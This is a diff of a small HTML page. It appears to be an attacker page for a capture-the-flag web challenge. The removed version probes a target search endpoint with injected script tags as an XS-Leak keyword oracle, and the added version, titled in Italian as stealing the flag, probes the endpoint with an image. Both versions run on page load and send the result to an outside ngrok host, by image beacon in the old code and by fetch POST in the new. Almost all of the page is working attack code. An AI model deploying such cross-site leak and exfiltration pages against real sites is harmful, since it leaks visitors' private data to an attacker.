@@ -1,47 +1,55 @@
 <!DOCTYPE html>
-<html lang="it">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XS-Leak Keyword Checker</title>
-    <script>
-        async function logResult(keyword, status) {
-            try {
-                const img = new Image();
-                img.src = `https://acca-87-4-142-72.ngrok-free.app/log?keyword=${encodeURIComponent(keyword)}&status=${status}`;
-            } catch (error) {
-                console.error('Error logging result:', error);
-            }
-        }
-
-        function checkKeywords() {
-            const keywords = ['Thomas', 'Anderson'];
-
-            for (const keyword of keywords) {
-                const script = document.createElement('script');
-                script.src = `https://matrix.capturetheflags.site/search?s=${encodeURIComponent(keyword)}`;
-
-                script.onload = () => {
-                    console.log(`Keyword found: ${keyword}`);
-                    logResult(keyword, 'found');
-                };
-
-                script.onerror = () => {
-                    console.log(`Keyword not found: ${keyword}`);
-                    logResult(keyword, 'not found');
-                };
-
-                document.head.appendChild(script);
-            }
-        }
-
-        // Esegui la funzione checkKeywords quando la pagina è completamente caricata
-        window.addEventListener('DOMContentLoaded', () => {
-            checkKeywords();
-        });
-    </script>
+    <title>Rubare Flag</title>
 </head>
 <body>
-    <h1>XS-Leak Keyword Checker</h1>
+    <h1>Rubare la Flag dell'Architetto</h1>
+
+    <script>
+        const stealFlag = () => {
+            const img = document.createElement('img');
+            img.src = 'https://matrix.capturetheflags.site/search?s=flag'; // Endpoint target
+
+            img.onload = () => {
+                console.log("Richiesta riuscita: flag accessibile!");
+
+                // Invia una richiesta al server con il risultato
+                fetch('https://acca-87-4-142-72.ngrok-free.app/receive_flag', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `flag=accessibile`
+                })
+                .then(response => response.text())
+                .then(data => console.log("Risultato inviato:", data))
+                .catch(error => console.error('Errore invio risultato:', error));
+            };
+
+            img.onerror = () => {
+                console.log("Errore: flag non accessibile.");
+
+                // Invia una richiesta al server con il risultato
+                fetch('https://acca-87-4-142-72.ngrok-free.app/receive_flag', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `flag=non_accessibile`
+                })
+                .then(response => response.text())
+                .then(data => console.log("Risultato inviato:", data))
+                .catch(error => console.error('Errore invio risultato:', error));
+            };
+
+            document.body.appendChild(img);
+        };
+
+        // Eseguire automaticamente la funzione al caricamento della pagina
+        window.onload = stealFlag;
+    </script>
 </body>
 </html>
